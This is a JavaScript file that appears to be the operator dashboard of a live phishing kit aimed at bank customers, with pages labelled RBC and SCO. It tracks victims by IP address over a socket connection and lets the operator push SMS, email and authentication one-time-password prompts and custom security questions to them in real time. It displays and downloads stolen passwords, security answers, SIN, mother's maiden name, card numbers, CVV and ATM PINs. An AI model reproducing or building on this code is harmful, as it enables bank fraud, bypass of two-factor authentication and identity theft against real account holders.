const socket = io()

function downloadUserData(details) {
  // Compile user data into a string (you can choose JSON or plain text)
  const userDataStr = JSON.stringify(details, null, 2);

  // Create a Blob from the string
  const blob = new Blob([userDataStr], { type: 'application/json' });

  // Create a download link and trigger a click event
  const downloadLink = document.createElement('a');
  downloadLink.href = URL.createObjectURL(blob);
  downloadLink.download = `UserData_${details.ip || 'unknown'}.json`;
  downloadLink.click();
}

document.getElementById('deleteAll').addEventListener('click', function () {
  socket.emit('deleteAll');
});

socket.on('join', (users) => {
  let count = 0
  users.forEach(([ipAddress, details]) => {
    if (details.status == 'actif') {
      count++;
    }
  });
  updateConnectionsTable(users);
  updateActiveUserCount(count); // Update the count of active users
});

socket.on('leave', (users) => {
  let count = 0
  users.forEach(([ipAddress, details]) => {
    if (details.status == 'actif') {
      count++;
    }
  });
  updateConnectionsTable(users);
  updateActiveUserCount(count); // Update the count of active users
});

function updateConnectionsTable(users) {
  const container = document.getElementById('userContainer');

  container.innerHTML = '';

  users.sort(([ip1, details1], [ip2, details2]) => {
    if (details1.status === 'actif' && details2.status !== 'actif') {
      return -1; // 'actif' comes first
    }
    if (details1.status !== 'actif' && details2.status === 'actif') {
      return 1; // 'actif' comes first
    }
    return 0; // No change in order
  });

  users.forEach(([ipAddress, details]) => {
    const userDiv = document.createElement('div');
    userDiv.className = 'col-md-4';

    let color;
    if (details.stage === 'Finish') {
      color = 'warning'; // Set color to warning for users on the finish page
      details.status = 'finish'
    } else {
      color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
    }

    if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
      userDiv.innerHTML = `
        
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
              <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
              <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
            </div>
          </div>
    
          `;

          let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
          let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
          sendOtpSmsButton.addEventListener('click', function() {
            socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
            console.log('emit otp send')
          });

          sendOtpEmailButton.addEventListener('click', function() {
            socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
            console.log('emit otp send')
          });          
    } else if(details.stage == "OTP") {

        userDiv.innerHTML = `
        
        <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
        <div class="card">
          <div class="card-header">
            <span class="badge bg-${color}">
              ${ipAddress}
            </span>
          </div>
          <div class="card-body">
            <h5 class="card-title">${details.page || ''}</h5>
            <p class="card-text">${details.stage || ''}</p>
            <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          </div>
        </div>
  
        `;
      
      
    } else if(details.stage == "Loading"){

      userDiv.innerHTML = `
        
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
              <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
              <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>
            </div>
          </div>
    
          `;

          let sendOtpGoodButton = userDiv.querySelector('.send-otp-good-button');
          let sendOtpBadButton = userDiv.querySelector('.send-otp-bad-button');
          sendOtpGoodButton.addEventListener('click', function() {
            socket.emit('sendOTPResponse', {ip: ipAddress, res: `good` })
          });

          sendOtpBadButton.addEventListener('click', function() {
            socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
          });          

    } else if(details.page == 'SCO' && details.stage != 'Finish'){
      userDiv.innerHTML = `
        
      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
      <div class="card">
        <div class="card-header">
          <span class="badge bg-${color}">
            ${ipAddress}
          </span>
        </div>
        <div class="card-body">
          <h5 class="card-title">${details.page || ''}</h5>
          <p class="card-text">${details.stage || ''}</p>
          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
          </div>
      </div>

      `;

      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
      let sendAuthButton = userDiv.querySelector('.send-auth-button');
      sendOtpSmsButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
      });

      sendOtpEmailButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
      });     
      
      sendAuthButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
      });    
    } else if(details.page == 'RBC' && details.stage != 'Finish'){
      userDiv.innerHTML = `
        
      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
      <div class="card">
        <div class="card-header">
          <span class="badge bg-${color}">
            ${ipAddress}
          </span>
        </div>
        <div class="card-body">
          <h5 class="card-title">${details.page || ''}</h5>
          <p class="card-text">${details.stage || ''}</p>
          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
          <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>
          </div>
      </div>

      `;

      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
      let sendAuthButton = userDiv.querySelector('.send-auth-button');
      let customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
      sendOtpSmsButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
      });

      sendOtpEmailButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
      });     
      
      sendAuthButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
      });    

      customQuestionTrigger.addEventListener('click', function() {
        $('#customQuestionModal').modal('show');
      });

      document.getElementById('sendCustomQuestionButton').addEventListener('click', function() {
        var customQuestion = document.getElementById('customQuestion').value;
        socket.emit('sendOTP', {ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
        $('#customQuestionModal').modal('hide');
      })
    } else {
      userDiv.innerHTML = `
       
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
            </div>
          </div>
     
          `;
    }

    let resultsButton = userDiv.querySelector('.results-button');

    resultsButton.addEventListener('click', function () {
      let modalBody = document.querySelector('#resultsModal .modal-body');
      let ipModel = ipAddress
      socket.emit('getUserData');
      socket.on('setUserData', (userData) => {

        userData.forEach(([ipAddress, details]) => {
          if (details.ip == ipModel) {
            if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {

              modalBody.innerHTML = `   <div class="card">
                     <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
        <div class="card-header">
            IP: ${ipAddress}
        </div>
        <ul class="list-group list-group-flush">
            <li class="list-group-item">Username: ${details.getUserDataLogin.username || ''}</li>
            <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
            <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
              <li class="list-group-item">----------------------------------------------------------</li>
              <li class="list-group-item">${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}</li>
              <li class="list-group-item">${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}</li>
              <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
              <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
              <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
              <li class="list-group-item">${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}</li>
                <li class="list-group-item">----------------------------------------------------------</li>
            <li class="list-group-item">Full Name: ${details.getUserDataDetails.name || ''}</li>
            <li class="list-group-item">Address: ${details.getUserDataDetails.address || ''}</li>
            <li class="list-group-item">City: ${details.getUserDataDetails.city || ''}</li>
            <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
            <li class="list-group-item">Postal Code: ${details.getUserDataDetails.postal || ''}</li>
            <li class="list-group-item">Digit Pin: ${details.getUserDataDetails.pin || ''}</li>
            <li class="list-group-item">Email: ${details.getUserDataDetails.email || ''}</li>
            <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}</li>
            <li class="list-group-item">Mmn: ${details.getUserDataDetails.mmn || ''}</li>
            <li class="list-group-item">Sin: ${details.getUserDataDetails.sin || ''}</li>
            <li class="list-group-item">Driver Licence: ${details.getUserDataDetails.drivers || ''}</li>
             <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">Card Number: ${details.getUserDataCard.card || ''}</li>
             <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp2 || ''}</li>
            <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
            <li class="list-group-item">ATM PIN: ${details.getUserDataCard.atm || ''}</li>
             <li class="list-group-item">----------------------------------------------------------</li>
            <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
        </ul> </div>`;

              
              document.getElementById('downloadButton').addEventListener('click', function () {
                downloadUserData(details); 
              });


            } else {
              modalBody.innerHTML = `No result for IP: ${ipAddress}`;
            }
          }
        })

      })

      
      let modal = new bootstrap.Modal(document.getElementById('resultsModal'));
      modal.show();
    });
    container.appendChild(userDiv);
  });

}

function updateActiveUserCount(newCount) {
  document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}